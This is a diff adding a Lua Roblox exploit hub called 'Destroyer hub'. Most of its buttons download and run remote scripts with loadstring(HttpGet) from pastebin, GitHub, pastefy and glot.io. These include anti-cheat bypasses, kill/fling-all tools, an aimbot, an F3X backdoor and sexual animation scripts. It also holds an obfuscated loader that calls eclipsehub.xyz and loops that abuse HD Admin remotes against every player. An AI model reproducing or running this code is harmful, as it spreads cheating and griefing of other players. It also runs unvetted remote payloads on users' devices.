@@ -1,0 +1,1017 @@
+-- New draggable Orion Lib script for hub creations!
+local OrionLib = loadstring(game:HttpGet(('https://pastebin.com/raw/WRUyYTdY')))()
+
+local Window = OrionLib:MakeWindow({
+    Name = "Destroyer hub",
+    HidePremium = false,
+    SaveConfig = true,
+    ConfigFolder = "DestroyerHub" -- Met un nom personnalisé pour ton hub ici
+})
+
+print("Successfully executed.") -- Just a debug
+
+local Tab = Window:MakeTab({
+    Name = "kill/bringHead",
+    Icon = "rbxassetid://1",
+    PremiumOnly = false
+})
+
+local Section = Tab:AddSection({
+    Name = "Destroyer ☠️"
+})
+
+Tab:AddButton({
+    Name = "bring all head",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastefy.app/Q9DvbeiV/raw"))()
+    end    
+})
+
+Tab:AddButton({
+    Name = "fling all",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
+    end    
+})
+
+local Tab2 = Window:MakeTab({
+    Name = "HD",
+    Icon = "rbxassetid://16208317412",
+    PremiumOnly = false
+})
+
+Tab2:AddButton({
+    Name = "Nameless admin",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/Source.lua"))()
+    end    
+})
+
+Tab2:AddButton({
+    Name = "Fate Admin",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))()
+    end    
+})
+
+Tab2:AddButton({
+    Name = "infinite yield DELTA",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/rrixh/uwuware/main/skripts/deltaIYmobile-kraxk.ppt",true))()
+    end    
+})
+
+Tab2:AddButton({
+    Name = "Gx admin",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/v6E9BmFK",true))()
+    end    
+})
+
+Tab2:AddButton({
+    Name = "Federo admin",
+    Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/alexx1212/fedoratoomutch/main/toomucth'))()
+    end    
+})
+
+Tab2:AddButton({
+    Name = "HomeBrew Admin",
+    Callback = function()
+        _G.CustomUI = false
+        loadstring(game:HttpGet(('https://raw.githubusercontent.com/mgamingpro/HomebrewAdmin/master/Main'),true))()
+    end    
+})
+
+Tab2:AddButton({
+    Name = "Revemped Admin",
+    Callback = function()
+        loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Nameless-admin-works-after-discontinued-updated9362"))()
+    end    
+})
+
+Tab2:AddButton({
+    Name = "Cmd X",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source", true))()
+    end    
+})
+
+local Tab3 = Window:MakeTab({
+    Name = "Gui",
+    Icon = "rbxassetid://12345684588",
+    PremiumOnly = false
+})
+
+Tab3:AddButton({
+    Name = "Rochips panel",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastefy.app/XZfnqnh0/raw"))()
+    end    
+})
+
+Tab3:AddButton({
+    Name = "Audio panel",
+    Callback = function()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Audio-Panel-11581"))()
+    end    
+})
+
+Tab3:AddButton({
+    Name = "Backdoor Scan",
+    Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script'))()
+    end    
+})
+
+Tab3:AddButton({
+    Name = "Genesis hub",
+    Callback = function()
+        loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Genesis-Hub-9584"))()
+    end    
+})
+
+Tab3:AddButton({
+    Name = "Dex keyless",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/DEX-Explorer/main/Mobile.lua"))()
+    end    
+})
+
+Tab3:AddButton({
+    Name = "Remote hub",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/zephyr10101/RemoteHub/main/Main"))()
+    end    
+})
+
+Tab3:AddButton({
+    Name = "Ghost hub",
+    Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()
+    end    
+})
+
+Tab3:AddButton({
+    Name = "Opfinality",
+    Callback = function()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/OpFinality_590"))()
+    end    
+})
+
+Tab3:AddButton({
+    Name = "universal hub",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/GamerScripter/Game-Hub/main/loader"))()
+    end    
+})
+
+Tab3:AddButton({
+    Name = "trolling hub",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/FE%20Trolling%20GUI.luau"))()
+    end    
+})
+
+local Tab4 = Window:MakeTab({
+    Name = "Boombox scripts Hub",
+    Icon = "rbxassetid://10218885518",
+    PremiumOnly = false
+})
+
+Tab4:AddButton({
+    Name = "Salmon hub",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastefy.app/YrsfKFKO/raw"))()
+    end    
+})
+
+Tab4:AddButton({
+    Name = "Pineapple scripts",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/zRHcqpLe", true))()
+    end    
+})
+
+Tab4:AddButton({
+    Name = "Keyboard",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/GGH52lan/GGH52lan/main/keyboard.txt"))()
+    end    
+})
+
+local Tab5 = Window:MakeTab({
+    Name = "mm2",
+    Icon = "rbxassetid://1821888531",
+    PremiumOnly = false
+})
+
+Tab5:AddButton({
+    Name = "YARHM HUB",
+    Callback = function()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Murder-Mystery-2-MM-AUTO-SHOOT-15532"))()
+    end    
+})
+
+Tab5:AddButton({
+    Name = "mm2 admin panel",
+    Callback = function()
+        
+    end    
+})
+
+Tab5:AddButton({
+    Name = "Esclipe hub",
+    Callback = function()
+        getgenv().mainKey = "nil";
+ 
+local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https\58//api.eclipsehub.xyz/auth";c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
+    end    
+})
+
+local Tab6 = Window:MakeTab({
+    Name = "Brookhaven rp",
+    Icon = "rbxassetid://17600207895",
+    PremiumOnly = false
+})
+
+Tab6:AddButton({
+    Name = "Imperial hub",
+    Callback = function()
+        loadstring(game:HttpGet(("https://raw.githubusercontent.com/Trev0rZ/LoaderM/main/ImperialHub-Working.lua"),true))()
+    end    
+})
+
+Tab6:AddButton({
+    Name = "RD4 HUB",
+    Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/M1ZZ001/BrookhavenR4D/main/Brookhaven%20R4D%20Script'))()
+    end    
+})
+
+Tab6:AddButton({
+    Name = "Rochips panel troll",
+    Callback = function()
+        if "you wanna use rochips universal" then
+	local z_x,z_z="gzrux646yj/raw/main.ts","https://glot.io/snippets/"
+	local im,lonely,z_c=task.wait,game,loadstring
+	z_c(lonely:HttpGet(z_z..""..z_x))()
+	return ("This will load in about 2 - 30 seconds" or "according to your device and executor")
+end
+    end    
+})
+
+Tab6:AddButton({
+    Name = "Sander X hub",
+    Callback = function()
+        loadstring(game:HttpGet(('https://raw.githubusercontent.com/sXPiterXs1111/Sanderxv3.30/main/sanderx3.30')))()
+    end    
+})
+
+local Tab7 = Window:MakeTab({
+    Name = "bypass AC",
+    Icon = "rbxassetid://176002395",
+    PremiumOnly = false
+})
+
+Tab7:AddButton({
+    Name = "AntiKick",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/Anti-Kick/refs/heads/main/Anti-Kick.lua"))()
+    end    
+})
+
+Tab7:AddButton({
+    Name = "Adonis bypass",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua",true))()
+    end    
+})
+
+local Tab8 = Window:MakeTab({
+    Name = "Harked/Comet",
+    Icon = "rbxassetid://196992795",
+    PremiumOnly = false
+})
+
+Tab8:AddButton({
+    Name = "Harked v2",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/JxcExploit/Harkedv2-script/main/Leaked-v2hardked"))()
+    end    
+})
+
+Tab8:AddButton({
+    Name = "Comet",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/FE/main/Comet"))();
+    end    
+})
+
+Tab8:AddButton({
+    Name = "Harked PandaExploit",
+    Callback = function()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Live-Life-Rich-and-Famous-in-Paradise!-harked-that-only-work-for-this-game-8800"))()
+    end    
+})
+
+Tab8:AddButton({
+    Name = "Quirky Admin",
+    Callback = function()
+        loadstring(game:HttpGet("https://gist.github.com/someunknowndude/38cecea5be9d75cb743eac8b1eaf6758/raw"))()
+    end    
+})
+
+local Tab9 = Window:MakeTab({
+    Name = "Mics",
+    Icon = "rbxassetid://1959203705",
+    PremiumOnly = false
+})
+
+Tab9:AddButton({
+    Name = "fly gui V3",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/bHa6HDFc"))()
+    end    
+})
+
+Tab9:AddButton({
+    Name = "IgnoreFitouchintereste",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/zephyr10101/ignore-touchinterests/main/main",true))()
+    end    
+})
+
+Tab9:AddButton({
+    Name = "God Mod",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/ZAPFnK3W"))()
+    end    
+})
+
+Tab9:AddButton({
+    Name = "WalkSpeed",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/HGvBTQ7y"))()
+    end    
+})
+
+Tab9:AddButton({
+    Name = "Universal aimbot",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Mick-gordon/Hyper-Escape/main/DeleteMobCheatEngine.lua"))()
+    end    
+})
+
+Tab9:AddButton({
+    Name = "invisible Gui",
+    Callback = function()
+        loadstring(game:HttpGet('https://pastebin.com/raw/3Rnd9rHf'))()
+    end    
+})
+
+Tab9:AddButton({
+    Name = "Control npcs",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty38.lua"))()
+    end    
+})
+
+Tab9:AddButton({
+    Name = "MultiGear Press E",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/TjR8NAT2"))()
+    end    
+})
+
+Tab9:AddButton({
+    Name = "Keyboard",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/GGH52lan/GGH52lan/main/keyboard.txt"))()
+    end    
+})
+
+Tab9:AddButton({
+    Name = "Tpwalk Gui",
+    Callback = function()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-tpwalk-script-17608"))()
+    end    
+})
+
+Tab9:AddButton({
+    Name = "ToolDraw",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Affexter/Programs/refs/heads/main/scripts/tooldrawFE.lua"))()
+    end    
+})
+
+local Tab9 = Window:MakeTab({
+    Name = "Animation",
+    Icon = "rbxassetid://95593705",
+    PremiumOnly = false
+})
+
+Tab9:AddButton({
+    Name = "Energize Gui R15",
+    Callback = function()
+        loadstring(game:HttpGet(('https://pastebin.com/raw/1p6xnBNf'),true))()
+    end    
+})
+
+Tab9:AddButton({
+    Name = "Animation R6 Gui",
+    Callback = function()
+        loadstring(game:HttpGet("https://gist.githubusercontent.com/MelonsStuff/f018928d2f010789a150b4924e279b16/raw/8de399eb9cbccbde430fcd37270cd4ff171f8b8e/AnimationGUI.txt"))()
+    end    
+})
+
+Tab9:AddButton({
+    Name = "Fe glio r6 just",
+    Callback = function()
+        writefile(".nonecing", "white")
+loadstring(game:HttpGet(('https://glot.io/snippets/gua2ntmbdm/raw/main.lua'),true))()
+    end    
+})
+
+Tab9:AddButton({
+    Name = "Fe sus hub",
+    Callback = function()
+        local player = game.Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local isR6 = character:FindFirstChild("Torso") ~= nil
+
+-- Notification Function
+local function showNotification(message)
+    local notificationGui = Instance.new("ScreenGui")
+    notificationGui.Name = "NotificationGui"
+    notificationGui.Parent = game.CoreGui
+
+    local notificationFrame = Instance.new("Frame")
+    notificationFrame.Size = UDim2.new(0, 300, 0, 50)
+    notificationFrame.Position = UDim2.new(0.5, -150, 1, -60)
+    notificationFrame.AnchorPoint = Vector2.new(0.5, 1)
+    notificationFrame.BackgroundColor3 = Color3.fromRGB(60, 60, 255) -- Blue color
+    notificationFrame.BorderSizePixel = 0
+    notificationFrame.Parent = notificationGui
+
+    local uicorner = Instance.new("UICorner")
+    uicorner.CornerRadius = UDim.new(0, 10)
+    uicorner.Parent = notificationFrame
+
+    local textLabel = Instance.new("TextLabel")
+    textLabel.Size = UDim2.new(1, -20, 1, 0)
+    textLabel.Position = UDim2.new(0, 10, 0, 0)
+    textLabel.BackgroundTransparency = 1
+    textLabel.Text = message .. " | by pyst"
+    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    textLabel.Font = Enum.Font.SourceSansBold
+    textLabel.TextSize = 18
+    textLabel.TextXAlignment = Enum.TextXAlignment.Left
+    textLabel.Parent = notificationFrame
+
+    notificationFrame.BackgroundTransparency = 1
+    textLabel.TextTransparency = 1
+
+    game:GetService("TweenService"):Create(
+        notificationFrame,
+        TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
+        {BackgroundTransparency = 0}
+    ):Play()
+
+    game:GetService("TweenService"):Create(
+        textLabel,
+        TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
+        {TextTransparency = 0}
+    ):Play()
+
+    task.delay(5, function()
+        game:GetService("TweenService"):Create(
+            notificationFrame,
+            TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.In),
+            {BackgroundTransparency = 1}
+        ):Play()
+
+        game:GetService("TweenService"):Create(
+            textLabel,
+            TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.In),
+            {TextTransparency = 1}
+        ):Play()
+
+        task.delay(0.5, function()
+            notificationGui:Destroy()
+        end)
+    end)
+end
+
+-- Show notification based on rig type
+if isR6 then
+    showNotification("🌟 R6 detected!")
+else
+    showNotification("✨ R15 detected!")
+end
+
+-- Create Screen GUI
+local gui = Instance.new("ScreenGui")
+gui.Name = "BangGui"
+gui.Parent = game.CoreGui
+
+-- Main Frame
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 300, 0, 300)
+mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+mainFrame.BackgroundColor3 = Color3.fromRGB(80, 80, 255) -- Deep Blue
+mainFrame.BorderSizePixel = 0
+mainFrame.Parent = gui
+
+local uicorner = Instance.new("UICorner")
+uicorner.CornerRadius = UDim.new(0, 20)
+uicorner.Parent = mainFrame
+
+-- Title
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, -60, 0, 30)
+title.Position = UDim2.new(0, 10, 0, 0)
+title.BackgroundTransparency = 1
+title.Text = "🎨 Choose a Script"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.Font = Enum.Font.SourceSansBold
+title.TextSize = 24
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = mainFrame
+
+-- Close Button
+local closeButton = Instance.new("TextButton")
+closeButton.Size = UDim2.new(0, 30, 0, 30)
+closeButton.Position = UDim2.new(1, -40, 0, 0)
+closeButton.BackgroundColor3 = Color3.fromRGB(255, 100, 100) -- Red
+closeButton.Text = "X"
+closeButton.Font = Enum.Font.SourceSansBold
+closeButton.TextSize = 20
+closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+closeButton.Parent = mainFrame
+
+local closeCorner = Instance.new("UICorner")
+closeCorner.CornerRadius = UDim.new(0, 10)
+closeCorner.Parent = closeButton
+
+closeButton.MouseButton1Click:Connect(function()
+    gui:Destroy()
+end)
+
+-- Minimize Button
+local minimizeButton = Instance.new("TextButton")
+minimizeButton.Size = UDim2.new(0, 30, 0, 30)
+minimizeButton.Position = UDim2.new(1, -80, 0, 0)
+minimizeButton.BackgroundColor3 = Color3.fromRGB(255, 200, 0) -- Orange
+minimizeButton.Text = "-"
+minimizeButton.Font = Enum.Font.SourceSansBold
+minimizeButton.TextSize = 20
+minimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+minimizeButton.Parent = mainFrame
+
+local minimizeCorner = Instance.new("UICorner")
+minimizeCorner.CornerRadius = UDim.new(0, 10)
+minimizeCorner.Parent = minimizeButton
+
+local minimized = false
+minimizeButton.MouseButton1Click:Connect(function()
+    minimized = not minimized
+    if minimized then
+        mainFrame:TweenSize(UDim2.new(0, 300, 0, 30), Enum.EasingDirection.In, Enum.EasingStyle.Quint, 0.5)
+    else
+        mainFrame:TweenSize(UDim2.new(0, 300, 0, 300), Enum.EasingDirection.Out, Enum.EasingStyle.Quint, 0.5)
+    end
+end)
+
+-- Scrolling Frame
+local scrollingFrame = Instance.new("ScrollingFrame")
+scrollingFrame.Size = UDim2.new(1, -20, 1, -50)
+scrollingFrame.Position = UDim2.new(0, 10, 0, 40)
+scrollingFrame.BackgroundTransparency = 1
+scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 300)
+scrollingFrame.ScrollBarThickness = 6
+scrollingFrame.Parent = mainFrame
+
+local layout = Instance.new("UIListLayout")
+layout.Padding = UDim.new(0, 10)
+layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+layout.Parent = scrollingFrame
+
+-- Buttons Data
+local buttons = {
+    {name = "🎯 Bang V2", r6 = "https://pastebin.com/raw/aPSHMV6K", r15 = "https://pastebin.com/raw/1ePMTt9n"},
+    {name = "🎉 Get Banged", r6 = "https://pastebin.com/raw/zHbw7ND1", r15 = "https://pastebin.com/raw/7hvcjDnW"},
+    {name = "💥 Suck", r6 = "https://pastebin.com/raw/SymCfnAW", r15 = "https://pastebin.com/raw/p8yxRfr4"},
+    {name = "🔥 Get Suc", r6 = "https://pastebin.com/raw/FPu4e2Qh", r15 = "https://pastebin.com/raw/DyPP2tAF"},
+    {name = "⚡ Jerk", r6 = "https://pastefy.app/wa3v2Vgm/raw", r15 = "https://pastefy.app/YZoglOyJ/raw"}
+}
+
+for _, buttonData in ipairs(buttons) do
+    local button = Instance.new("TextButton")
+    button.Size = UDim2.new(0.8, 0, 0, 40)
+    button.BackgroundColor3 = Color3.fromRGB(math.random(100, 255), math.random(100, 255), math.random(100, 255)) -- Random colors
+    button.Text = buttonData.name
+    button.Font = Enum.Font.SourceSansBold
+    button.TextSize = 20
+    button.TextColor3 = Color3.fromRGB(255, 255, 255)
+    button.Parent = scrollingFrame
+
+    local uicorner = Instance.new("UICorner")
+    uicorner.CornerRadius = UDim.new(0, 10)
+    uicorner.Parent = button
+
+    button.MouseButton1Click:Connect(function()
+        if isR6 then
+            loadstring(game:HttpGet(buttonData.r6))()
+        else
+            loadstring(game:HttpGet(buttonData.r15))()
+        end
+    end)
+end
+    end    
+})
+
+Tab9:AddButton({
+    Name = "Fe Gale Fighter",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/XPGSMEw9"))()
+    end    
+})
+
+Tab9:AddButton({
+    Name = "touch fling",
+    Callback = function()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Touch-fling-script-22447"))()
+    end    
+})
+
+Tab9:AddButton({
+    Name = "Fe Sad Boy",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/hgPJbwF0"))()
+    end    
+})
+
+local Tab10 = Window:MakeTab({
+    Name = "Gang up simulator",
+    Icon = "rbxassetid://114174716101522",
+    PremiumOnly = false
+})
+
+Tab10:AddButton({
+    Name = "Best gui by me",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/uPAaYu0B"))()
+    end    
+})
+
+local Tab11 = Window:MakeTab({
+    Name = "Hd Admin Script",
+    Icon = "rbxassetid://11417471622",
+    PremiumOnly = false
+})
+
+Tab11:AddButton({
+    Name = "Hd Admin Panel",
+    Callback = function()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-HD-Admin-Panel-34209"))()
+    end    
+})
+
+Tab11:AddButton({
+    Name = "kill all",
+    Callback = function()
+        local prefix = ";" -- préfixe HD Admin
+local cmdName = "kill" -- commande HD Admin
+
+-- Pour kill tout le monde
+for _, player in pairs(game.Players:GetPlayers()) do
+    local args = { [1] = prefix .. cmdName .. " " .. player.Name }
+    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
+        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
+    wait(0.1)
+end
+    end    
+})
+
+Tab11:AddButton({
+    Name = "bring all",
+    Callback = function()
+        local prefix = ";" -- préfixe HD Admin
+local cmdName = "bring" -- commande HD Admin
+
+-- Pour kill tout le monde
+for _, player in pairs(game.Players:GetPlayers()) do
+    local args = { [1] = prefix .. cmdName .. " " .. player.Name }
+    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
+        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
+    wait(0.1)
+end
+    end    
+})
+
+Tab11:AddButton({
+    Name = "freeze all",
+    Callback = function()
+        local prefix = ";" -- préfixe HD Admin
+local cmdName = "freeze" -- commande HD Admin
+
+-- Pour kill tout le monde
+for _, player in pairs(game.Players:GetPlayers()) do
+    local args = { [1] = prefix .. cmdName .. " " .. player.Name }
+    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
+        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
+    wait(0.1)
+end
+    end    
+})
+
+Tab11:AddButton({
+    Name = "btools all",
+    Callback = function()
+        local prefix = ";" -- préfixe HD Admin
+local cmdName = "btools" -- commande HD Admin
+
+-- Pour kill tout le monde
+for _, player in pairs(game.Players:GetPlayers()) do
+    local args = { [1] = prefix .. cmdName .. " " .. player.Name }
+    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
+        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
+    wait(0.1)
+end
+    end    
+})
+
+Tab11:AddButton({
+    Name = "invisible all",
+    Callback = function()
+        local prefix = ";" -- préfixe HD Admin
+local cmdName = "invisible" -- commande HD Admin
+
+-- Pour kill tout le monde
+for _, player in pairs(game.Players:GetPlayers()) do
+    local args = { [1] = prefix .. cmdName .. " " .. player.Name }
+    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
+        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
+    wait(0.1)
+end
+    end    
+})
+
+Tab11:AddButton({
+    Name = "re all",
+    Callback = function()
+        local prefix = ";" -- préfixe HD Admin
+local cmdName = "re" -- commande HD Admin
+
+-- Pour kill tout le monde
+for _, player in pairs(game.Players:GetPlayers()) do
+    local args = { [1] = prefix .. cmdName .. " " .. player.Name }
+    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
+        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
+    wait(0.1)
+end
+    end    
+})
+
+Tab11:AddButton({
+    Name = "ff all",
+    Callback = function()
+        local prefix = ";" -- préfixe HD Admin
+local cmdName = "ff" -- commande HD Admin
+
+-- Pour kill tout le monde
+for _, player in pairs(game.Players:GetPlayers()) do
+    local args = { [1] = prefix .. cmdName .. " " .. player.Name }
+    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
+        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
+    wait(0.1)
+end
+    end    
+})
+
+Tab11:AddButton({
+    Name = "god mode all",
+    Callback = function()
+        local prefix = ";" -- préfixe HD Admin
+local cmdName = "god" -- commande HD Admin
+
+-- Pour kill tout le monde
+for _, player in pairs(game.Players:GetPlayers()) do
+    local args = { [1] = prefix .. cmdName .. " " .. player.Name }
+    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
+        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
+    wait(0.1)
+end
+    end    
+})
+
+Tab11:AddButton({
+    Name = "god me",
+    Callback = function()
+        game.Players:Chat(";god me")
+    end    
+})
+
+Tab11:AddButton({
+    Name = "ff me",
+    Callback = function()
+        game.Players:Chat(";ff me")
+    end    
+})
+
+Tab11:AddButton({
+    Name = "btools me",
+    Callback = function()
+        game.Players:Chat(";btools me")
+    end    
+})
+
+Tab11:AddButton({
+    Name = "respawn",
+    Callback = function()
+        game.Players:Chat(";re")
+    end    
+})
+
+Tab11:AddButton({
+    Name = "invisible me",
+    Callback = function()
+        game.Players:Chat(";invisible me")
+    end    
+})
+
+Tab11:AddButton({
+    Name = "SpawnLocation",
+    Callback = function()
+        game.Players:Chat(";insert 53326")
+    end    
+})
+
+Tab11:AddButton({
+    Name = "Drooling Zombie",
+    Callback = function()
+        game.Players:Chat(";insert 187789986")
+    end    
+})
+
+Tab11:AddButton({
+    Name = "Police Car",
+    Callback = function()
+        game.Players:Chat(";insert 6418230807")
+    end    
+})
+
+Tab11:AddButton({
+    Name = "Grass Baseplate",
+    Callback = function()
+        game.Players:Chat(";insert 10100805")
+    end    
+})
+
+Tab11:AddButton({
+    Name = "Zombie Spawn",
+    Callback = function()
+        game.Players:Chat(";insert 93601062")
+    end    
+})
+
+Tab11:AddButton({
+    Name = "Sport Car",
+    Callback = function()
+        game.Players:Chat(";insert 6433323089")
+    end    
+})
+
+Tab11:AddButton({
+    Name = "Doge",
+    Callback = function()
+        game.Players:Chat(";insert 257489726")
+    end    
+})
+
+Tab11:AddButton({
+    Name = "Rocket tool",
+    Callback = function()
+        game.Players:Chat(";insert 47637")
+    end    
+})
+
+Tab11:AddButton({
+    Name = "Super Car",
+    Callback = function()
+        game.Players:Chat(";insert 6433330180")
+    end    
+})
+
+Tab11:AddButton({
+    Name = "Meteor",
+    Callback = function()
+        game.Players:Chat(";insert 86374494")
+    end    
+})
+
+Tab11:AddButton({
+    Name = "",
+    Callback = function()
+        game.Players:Chat(";insert ")
+    end    
+})
+
+Tab11:AddButton({
+    Name = "Dummy",
+    Callback = function()
+        game.Players:Chat(";insert 124120704")
+    end    
+})
+
+Tab11:AddButton({
+    Name = "Wolf",
+    Callback = function()
+        game.Players:Chat(";insert 1989724206")
+    end    
+})
+
+Tab11:AddButton({
+    Name = "Alien",
+    Callback = function()
+        game.Players:Chat(";insert 69489068")
+    end    
+})
+
+Tab11:AddButton({
+    Name = "Civil War Canon",
+    Callback = function()
+        game.Players:Chat(";insert 174258074")
+    end    
+})
+
+Tab11:AddButton({
+    Name = "Bus",
+    Callback = function()
+        game.Players:Chat(";insert 59524699")
+    end    
+})
+
+Tab11:AddButton({
+    Name = "Godzilla",
+    Callback = function()
+        game.Players:Chat(";insert 3127241980")
+    end    
+})
+
+Tab11:AddButton({
+    Name = "TransFormers optimus",
+    Callback = function()
+        game.Players:Chat(";insert 521792865")
+    end    
+})
+
+Tab11:AddButton({
+    Name = "Monster Truck RC",
+    Callback = function()
+        game.Players:Chat(";insert 161159912")
+    end    
+})
+
+Tab11:AddButton({
+    Name = "StreamPunk Train",
+    Callback = function()
+        game.Players:Chat(";insert 157131091")
+    end    
+})
+
+Tab11:AddButton({
+    Name = "Rocket",
+    Callback = function()
+        game.Players:Chat(";insert 31603741")
+    end    
+})
+
+Tab11:AddButton({
+    Name = "Gear Service",
+    Callback = function()
+        game.Players:Chat(";insert 1075123174")
+    end    
+})
+
+local Tab12 = Window:MakeTab({
+    Name = "F3x replication",
+    Icon = "rbxassetid://11417471622",
+    PremiumOnly = false
+})
+
+Tab12:AddButton({
+    Name = "F3x Panel",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/SkireScripts/F3X-Panel/main/Main.lua"))()
+    end    
+})
+
+Tab12:AddButton({
+    Name = "f3x backdoor",
+    Callback = function()
+        loadstring(game:HttpGet('https://gist.githubusercontent.com/MRSBLACK999/a1521a41ab1d1b67f5073aacce0bce32/raw/432ed275c41a160eca06ca1ad473a67a50168182/Fe%2520F3x%2520Backdoor%2520Gui'))()
+    end    
+})
